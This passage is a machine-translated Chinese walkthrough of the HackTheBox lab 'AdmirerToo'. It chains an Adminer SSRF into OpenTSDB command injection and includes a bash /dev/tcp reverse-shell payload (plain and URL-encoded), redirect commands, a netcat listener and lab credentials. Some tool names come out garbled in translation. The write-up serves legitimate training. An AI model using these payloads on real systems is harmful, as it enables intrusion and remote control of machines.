<html>
<head>
<title>AdmirerToo from HackTheBox — Detailed Walkthrough</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">黑客盒子中的AdmirerToo详细演练</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/admirertoo-from-hackthebox-detailed-walkthrough-b005ec7a4877?source=collection_archive---------0-----------------------#2022-06-15">https://infosecwriteups.com/admirertoo-from-hackthebox-detailed-walkthrough-b005ec7a4877?source=collection_archive---------0-----------------------#2022-06-15</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><div class=""><h2 id="baa2" class="pw-subtitle-paragraph jn ip iq bd b jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke dk translated">向您展示完成盒子所需的所有工具和技术。</h2></div><h1 id="9ca1" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">机器信息</h1><figure class="ky kz la lb gt lc gh gi paragraph-image"><div class="gh gi kx"><img src="../Images/a6f46ad152fc0c39d6a898f4777881a4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1000/format:webp/0*yOQ8DNZBoJ3SoHMw.png"/></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">来自黑客盒子的计时</figcaption></figure><p id="2480" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">我们从端口80开始这个盒子，有一个网站，一些枚举为我们找到一个数据库。我们利用一个SSRF漏洞来查找运行在另一个端口上的OpenTSDB。这也是易受攻击的，我们利用漏洞在机器上获得一个外壳。环顾四周，我们发现OpenCats，MySQL和用户凭证。最终，我们以用户Jennifer的身份访问SSH，这允许我们进行端口转发并远程访问OpenCats站点。在这里，我们找到了一种方法，通过创建一个序列化的有效负载来删除bash脚本，并让root用户使用Fail2Ban漏洞和whois配置文件来执行它。</p><p id="abf1" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">所需的技能是良好的列举和利用研究知识。学到的技能是创建序列化的有效载荷，并链接漏洞以获得代码执行。</p><div class="mf mg gp gr mh mi"><a href="https://www.hackthebox.com/home/machines/profile/427" rel="noopener  ugc nofollow" target="_blank"><div class="mj ab fo"><div class="mk ab ml cl cj mm"><h2 class="bd ir gy z fp mn fr fs mo fu fw ip bi translated">admirator to——破解盒子::渗透测试实验室</h2><div class="mp l"><h3 class="bd b gy z fp mn fr fs mo fu fw dk translated">登录Hack The Box平台，让您的笔测试和网络安全技能更上一层楼！</h3></div><div class="mq l"><p class="bd b dl z fp mn fr fs mo fu fw dk translated">www.hackthebox.com</p></div></div><div class="mr l"><div class="ms l mt mu mv mr mw ld mi"/></div></div></a></div><h1 id="c4ea" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">初步侦察</h1><p id="8480" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">像往常一样，让我们从Nmap开始:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi nc"><img src="../Images/3d1b112d2f49c3534cec7347114fbe62.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*aQHPf2r8l9nTnWd591h2DQ.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">盒子的Nmap扫描</figcaption></figure><p id="9880" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">目前只有端口80可用，有几个以后可能感兴趣的端口被过滤掉:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi nh"><img src="../Images/a81919ecb064d7491c13d51798cd2eb6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*9ZeZL9YE6o6OqAEH.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">端口80上的网站</figcaption></figure><p id="cda1" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">网站上什么都没有，Feroxbuster也没有用蛮力找到任何东西。一个不存在的页面给了我们一个404没有找到预期:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="cc95" class="nn kg iq nj b gy no np l nq nr">┌──(root💀kali)-[~/htb/admirertoo]<br/>└─# curl -i http://10.10.11.137/pencer   <br/>HTTP/1.1 404 Not Found<br/>Date: Sat, 26 Feb 2022 13:10:59 GMT<br/>Server: Apache/2.4.38 (Debian)<br/>Content-Length: 325<br/>Content-Type: text/html; charset=iso-8859-1<br/><br/>&lt;!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"&gt;<br/>&lt;html&gt;&lt;head&gt;<br/>&lt;title&gt;404 Not Found&lt;/title&gt;<br/>&lt;/head&gt;&lt;body&gt;<br/>&lt;h1&gt;Not Found&lt;/h1&gt;<br/>&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt;<br/>&lt;hr&gt;<br/>&lt;address&gt;Apache/2.4.38 (Debian) Server at &lt;a href="mailto:webmaster@admirer-gallery.htb"&gt;10.10.11.137&lt;/a&gt; Port 80&lt;/address&gt;<br/>&lt;/body&gt;&lt;/html&gt;</span></pre><p id="5555" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">然而，mailto链接揭示了一个领域。让我们把它放在我们的主机文件中:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="3641" class="nn kg iq nj b gy no np l nq nr">┌──(root💀kali)-[~/htb/admirertoo]<br/>└─# echo "10.10.11.137 admirer-gallery.htb" &gt;&gt; /etc/ hosts</span></pre><h1 id="89a4" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">Gobuster</h1><p id="add0" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">浏览到那个地址会给我们同样简单的网页。让我们尝试另一种暴力，这次是寻找vhosts:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="364f" class="nn kg iq nj b gy no np l nq nr">┌──(root💀kali)-[~/htb/admirertoo]<br/>└─# gobuster vhost -t 100 -k -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://admirer-gallery.htb  <br/>===============================================================<br/>Gobuster v3.1.0<br/>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br/>===============================================================<br/>[+] Url:          http://admirer-gallery.htb<br/>[+] Method:       GET<br/>[+] Threads:      100<br/>[+] Wordlist:     /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt<br/>[+] User Agent:   gobuster/3.1.0<br/>[+] Timeout:      10s<br/>===============================================================<br/>2022/02/26 12:58:27 Starting gobuster in VHOST enumeration mode<br/>===============================================================<br/>Found: db.admirer-gallery.htb (Status: 200) [Size: 2511]<br/>===============================================================<br/>2022/02/26 13:01:14 Finished<br/>===============================================================</span></pre><p id="d005" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">现在我们有了一个子域，将其添加到我们的hosts文件中:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="fdfb" class="nn kg iq nj b gy no np l nq nr">┌──(root💀kali)-[~/htb/admirertoo]<br/>└─# echo "10.10.11.137 db.admirer-gallery.htb" &gt;&gt; /etc/ hosts</span></pre><h1 id="f76c" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">管理员</h1><p id="9792" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">浏览该网站，我们会发现Adminer 4.7.8的登录页面:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div class="gh gi ns"><img src="../Images/c2cb1d4bbbe9dc421afa59e073a07787.png" data-original-src="https://miro.medium.com/v2/resize:fit:1284/format:webp/0*KBrIQGX5wd7yMWc_.png"/></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">管理员登录页面</figcaption></figure><p id="0d6b" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">点击“回车”进入系统，我们可以浏览数据库:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi nt"><img src="../Images/26d2c36f80c3b5c26460da80b357b52f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*mcTV7GOaAoYjI_Zi.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">管理员数据库探索</figcaption></figure><p id="16c7" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">你在这里做不了什么。寻找漏洞我看到这个版本的Adminer是2020年12月的，这里有几个选项<a class="ae nu" href="https://www.cvedetails.com/vulnerability-list/vendor_id-17755/product_id-44183/Adminer-Adminer.html" rel="noopener ugc nofollow" target="_blank"/>。对于4.7.8我们有<a class="ae nu" href="https://www.cvedetails.com/cve/CVE-2021-21311/" rel="noopener ugc nofollow" target="_blank">CVE-2021–21311</a>与一个漏洞<a class="ae nu" href="https://github.com/vrana/adminer/files/5957311/Adminer.SSRF.pdf" rel="noopener ugc nofollow" target="_blank">在这里</a>。</p><h1 id="c2d6" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">SSRF脆弱性</h1><p id="ef95" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">通读这个漏洞，我们看到有一个SSRF漏洞，这里有一个脚本<a class="ae nu" href="https://gist.githubusercontent.com/bpsizemore/227141941c5075d96a34e375c63ae3bd/raw/0f5e8968a3490190d72ccefd40f9c6b693918d71/redirect.py" rel="noopener ugc nofollow" target="_blank"/>，我们可以用它来重定向请求。让我们抓住它，设置监听:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="0bac" class="nn kg iq nj b gy no np l nq nr">┌──(root💀kali)-[~/htb/admirertoo]<br/>└─# wget https://gist.githubusercontent.com/bpsizemore/227141941c5075d96a34e375c63ae3bd/raw/0f5e8968a3490190d72ccefd40f9c6b693918d71/redirect.py<br/>--2022-02-28 22:31:43--<br/>Connecting to gist.githubusercontent.com (gist.githubusercontent.com)|185.199.109.133|:443... connected.<br/>HTTP request sent, awaiting response... 200 OK<br/>Length: 1290 (1.3K) [text/plain]<br/>Saving to: ‘redirect.py.1’<br/>redirect.py   100%[===============&gt;]   1.26K  --.-KB/s    in 0s      <br/>2022-02-28 22:31:43 (139 MB/s) - ‘redirect.py’ saved [1290/1290]</span><span id="9c0a" class="nn kg iq nj b gy nv np l nq nr">┌──(root💀kali)-[~/htb/admirertoo]<br/>└─# python2 redirect.py --port 80 http://127.0.0.1<br/>serving at port 80</span></pre><p id="3730" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">等待之后，让我们开始打嗝，这样我们就可以拦截来自浏览器的请求。现在回到网站，准备拦截打嗝，点击此处进入:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div class="gh gi ns"><img src="../Images/2da40a861d839985626ee439b41b3072.png" data-original-src="https://miro.medium.com/v2/resize:fit:1284/format:webp/0*2C4oJEofXTKYPjIk.png"/></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">点击回车发送到打嗝</figcaption></figure><p id="a838" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">在Burp中，我们捕捉到了请求:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi nw"><img src="../Images/1c98c2f1cf96c86a50bd82faa641a3b5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*aQv2HLY049wW_mFm.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">使用打嗝来拦截请求</figcaption></figure><p id="7084" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">POST消息的最后一部分是URL编码的，如果您对它进行解码，它看起来像这样:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="ac70" class="nn kg iq nj b gy no np l nq nr">auth[driver]=server&amp;<br/>auth[server]=localhost&amp;<br/>auth[username]=admirer_ro&amp;<br/>auth[password]=1w4nn4b3adm1r3d2!&amp;<br/>auth[db]=admirer&amp;<br/>auth[permanent]=1</span></pre><p id="5400" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">如果你看看这个漏洞，它显示你改变系统字段为Elasticsearch，对于我们的表单，我们需要改变参数<strong class="ll ir"> auth[driver] </strong>，这是等价的。更复杂的是，如果你在文档中查看<a class="ae nu" href="https://github.com/vrana/adminer/blob/master/adminer/drivers/elastic.inc.php" rel="noopener ugc nofollow" target="_blank">这里</a>驱动程序实际上被称为elastic而不是elasticsearch。</p><p id="82cc" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">其次，该漏洞显示您将服务器更改为您的攻击机器IP，对于我们的表单，我们需要更改参数<strong class="ll ir">auth[服务器] </strong>，这是等效的。</p><p id="2686" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">所以我们改变的参数看起来像这样:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="e997" class="nn kg iq nj b gy no np l nq nr">auth[driver]=elastic&amp;<br/>auth[server]=10.10.16.95&amp;<br/>auth[username]=admirer_ro&amp;<br/>auth[password]=1w4nn4b3adm1r3d2!&amp;<br/>auth[db]=admirer&amp;<br/>auth[permanent]=1</span></pre><p id="cb16" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">URL对其进行编码，并在Burp中进行替换，如下所示:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi nx"><img src="../Images/2b22d18a059458766db3c3f70efd295a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*av-l8x4ZEqvDzSDK.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">Url编码字符串</figcaption></figure><p id="f8cc" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">单击forward，您将看到一个打嗝式的GET请求:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi ny"><img src="../Images/0d04c580b001712fc384e3ed60ec1ccf.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*X_XVNAKOgKjpHoAE.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">打嗝时转发请求</figcaption></figure><p id="9852" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">再次单击forward，您将看到如下页面，而不是我们之前看到的db admin屏幕:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi nz"><img src="../Images/5bef80d00523f38125112eeb48b9a446.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*MEiopDgHojQ83c_4.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">管理员页面显示来自漏洞的响应</figcaption></figure><p id="2930" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">如果你在输出上做html2text，你会看到它是来自我们在开始看到的最初的仰慕者-画廊. htb站点的index.php页面:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="20ef" class="nn kg iq nj b gy no np l nq nr">┌──(root💀kali)-[~/htb/admirertoo]<br/>└─# cat html | html2text<br/><br/>Admirer<br/>****** Admirer of theworld. ******<br/>Welcome to my image gallery.<br/>Are you an admirer too?<br/> [img/highway.jpg]<br/>******_Biodiesel_squid_******<br/>Have_you_ever_seen_anything_like_it?<br/>[img/portfolio_item_4.png]<br/>******_raclette_taxidermy_******<br/>Impressive,_isn't_it?<br/>&lt;SNIP&gt;</span></pre><p id="0214" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">查看我们在Kali中运行的重定向器，我们看到我们成功了:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="f55d" class="nn kg iq nj b gy no np l nq nr">┌──(root💀kali)-[~/htb/admirertoo]<br/>└─# python2 redirect.py --port 80 http://127.0.0.1<br/>serving at port 80<br/>10.10.11.137 - - [28/Feb/2022 22:53:51] "GET / HTTP/1.0" 301 -<br/>10.10.11.137 - - [28/Feb/2022 22:53:52] "GET / HTTP/1.0" 301 -</span></pre><p id="a30c" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">这证实了我们将请求重定向回机器上的端口80，并且我们可以使用SSRF来进一步枚举它。如果你需要一本关于SSRF的入门书，那么PortSwigger有一篇好文章<a class="ae nu" href="https://portswigger.net/web-security/ssrf" rel="noopener ugc nofollow" target="_blank">在这里</a>。</p><h1 id="4e17" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">扫描过滤端口</h1><p id="0793" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">如果我们回顾一下开始时的Nmap扫描，会发现有几个经过过滤的端口，这是我们感兴趣的一个:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="44b8" class="nn kg iq nj b gy no np l nq nr">4242/tcp  filtered vrml-multi-use</span></pre><p id="d8b1" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">利用我们使用SSRF攻击能力，我们可以从机器内部探测端口，我们只需要改变我们的重定向器:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="9b31" class="nn kg iq nj b gy no np l nq nr">┌──(root💀kali)-[~/htb/admirertoo]<br/>└─# python2 redirect.py --port 80 http://127.0.0.1:4242<br/>serving at port 80</span></pre><p id="9d84" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">现在，当我们收到Kali上的box请求时，我们会将其重定向回端口4242。我们需要执行与之前相同的过程来执行SSRF攻击。回到网络浏览器，进入登录页面。准备好拦截打嗝后，点击输入按钮:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div class="gh gi ns"><img src="../Images/822527c1c57f5e7b219b470fa1e9d946.png" data-original-src="https://miro.medium.com/v2/resize:fit:1284/format:webp/0*J-Qjw_4JNG5Yvad6.png"/></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">向打嗝者发送请求</figcaption></figure><p id="5895" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">更改最后一部分，使auth[driver]设置为elastic，auth[server]设置为我们的Kali IP:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi nx"><img src="../Images/dd75a62c8bbeda698e62fa9a90bd4c98.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*inSbb3MSEI7WVKrq.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">更改参数以指向Kali</figcaption></figure><p id="f697" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">单击forward，您将看到一个打嗝式的GET请求:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi ny"><img src="../Images/c563725ca740ec7fae7b676a47c9b4a6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*7UgwOfs4sLFJgd9W.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">通过打嗝拦截请求</figcaption></figure><p id="d311" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">再次单击forward，切换回浏览器以查看反射的输出:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi oa"><img src="../Images/0ba4c43ea3fbcbceeef78ed66cfd5a76.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*s9-pFt73jalhGBtM.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">在网站上查看反映的输出</figcaption></figure><h1 id="6292" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">OpenTSDB</h1><p id="9af1" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">可以看到页面标题写着OpenTSDB。我从未听说过这个，但快速搜索发现GitHub repo为它<a class="ae nu" href="https://github.com/OpenTSDB/opentsdb" rel="noopener ugc nofollow" target="_blank">这里</a>。寻找漏洞发现<a class="ae nu" href="https://nvd.nist.gov/vuln/detail/CVE-2020-35476" rel="noopener ugc nofollow" target="_blank">这个</a> CVE，与一个POC <a class="ae nu" href="https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2020/CVE-2020-35476.yaml" rel="noopener ugc nofollow" target="_blank">在这里</a>试图泄漏密码文件。我还在这个项目的<a class="ae nu" href="https://github.com/OpenTSDB/opentsdb/issues/2051" rel="noopener ugc nofollow" target="_blank">中找到了更多的信息。</a></p><p id="2037" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">所以我使用了这个例子，并把我的重定向器修改成这样:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi ob"><img src="../Images/4ee020c41d66a1e1ba8cd897e53be1a8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*8eRZ2-i9CEzJYbsywo1kCQ.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">Python运行我们的SSRF漏洞</figcaption></figure><p id="c778" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">这很难阅读，但我正在利用漏洞做一个密码文件的猫。和以前一样，回到浏览器，让Burp拦截，单击输入捕获请求，并更改auth[driver]和auth[server],就像我们上次做的那样。转发它，回到浏览器中，我们看到:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi oc"><img src="../Images/870cd2f4f73575ef97824569aa2575c4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*ArTDUmtZnluAYODH.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">错误显示指标不可用</figcaption></figure><p id="06c7" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">一个很长的错误列表，末尾的重要位被突出显示。没有sys.cpu.nice这样的指标。搜索在StackOverflow上找到了<a class="ae nu" href="https://stackoverflow.com/questions/18396365/opentsdb-get-all-metrics-via-http" rel="noopener ugc nofollow" target="_blank"> this </a>以列出可用的指标。更改我们的重定向器:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="7781" class="nn kg iq nj b gy no np l nq nr">┌──(root💀kali)-[~/htb/admirertoo]<br/>└─# python2 redirect.py --port 80 'http://127.0.0.1:4242/api/suggest?type=metrics'<br/>serving at port 80</span></pre><p id="df52" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">回到浏览器，用打嗝等方式拦截。转发后，我们在浏览器中看到以下响应:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div class="gh gi ns"><img src="../Images/4401fbd88547f5791d21c1b9bd369e24.png" data-original-src="https://miro.medium.com/v2/resize:fit:1284/format:webp/0*cZykyStsVJ6pW720.png"/></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">反射的响应显示可用的度量</figcaption></figure><p id="3591" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">所以现在我们知道唯一可用的度量是http.stats.web.hits。我花了很长时间试图使用这个度量在浏览器中显示passwd文件或任何其他文件。我没有得到一个错误，所以我确信我得到了正确的参数。最后我用了第一次成功的反向外壳！</p><h1 id="9952" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">反向外壳</h1><p id="c5fd" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">我用这个简单的反向外壳:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="19cc" class="nn kg iq nj b gy no np l nq nr">'/bin/bash -c "/bin/bash -i &gt;&amp; /dev/tcp/10.10.16.95/1337 0&gt;&amp;1"'</span></pre><p id="83c1" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">我对它进行了URL编码，所以它看起来像这样:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="9375" class="nn kg iq nj b gy no np l nq nr">%27%2f%62%69%6e%2f%62%61%73%68%20%2d%63%20%22%2f%62%69%6e%2f%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%30%2e%31%30%2e%31%36%2e%39%35%2f%31%33%33%37%20%30%3e%26%31%22%27</span></pre><p id="9ba9" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">然后，我启动了重定向器，将它作为要执行的系统命令:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="67ff" class="nn kg iq nj b gy no np l nq nr">┌──(root💀kali)-[~/htb/admirertoo]<br/>└─# python2 redirect.py --port 80 'http://127.0.0.1:4242/q?start=2000/10/21-00:00:00&amp;end=2020/10/25-15:56:44&amp;m=sum:http.stats.web.hits&amp;o=&amp;ylabel=&amp;xrange=10:10&amp;yrange=[33:system(%27%2f%62%69%6e%2f%62%61%73%68%20%2d%63%20%22%2f%62%69%6e%2f%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%30%2e%31%30%2e%31%36%2e%39%35%2f%34%34%34%34%20%30%3e%26%31%22%27)]&amp;wxh=1516x644&amp;style=linespoint&amp;baba=lala&amp;grid=t&amp;json'<br/>serving at port 80</span></pre><p id="c07d" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">回到浏览器，用打嗝等方式拦截。根据请求以打嗝的方式转发，然后返回到终端以查看我们是否已连接:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="4d67" class="nn kg iq nj b gy no np l nq nr">┌──(root💀kali)-[~]<br/>└─# nc -nlvp 4444 <br/>listening on [any] 4444 ...<br/>connect to [10.10.16.95] from (UNKNOWN) [10.10.11.137] 58776<br/>opentsdb@admirertoo:/$</span></pre><p id="68d8" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">在我们做任何事情之前升级shell:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="e422" class="nn kg iq nj b gy no np l nq nr">opentsdb@admirertoo:/$ which python<br/>/bin/python<br/>opentsdb@admirertoo:/$ python -c 'import pty;pty.spawn("/bin/bash")'<br/>opentsdb@admirertoo:/$ ^Z    <br/>zsh: suspended  nc -nlvp 4444<br/>┌──(root💀kali)-[~]<br/>└─# stty raw -echo; fg<br/>opentsdb@admirertoo:/$ stty rows 51 cols 236<br/>opentsdb@admirertoo:/$ export TERM=xterm</span></pre><h1 id="4588" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">OpenCats</h1><p id="76fe" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu 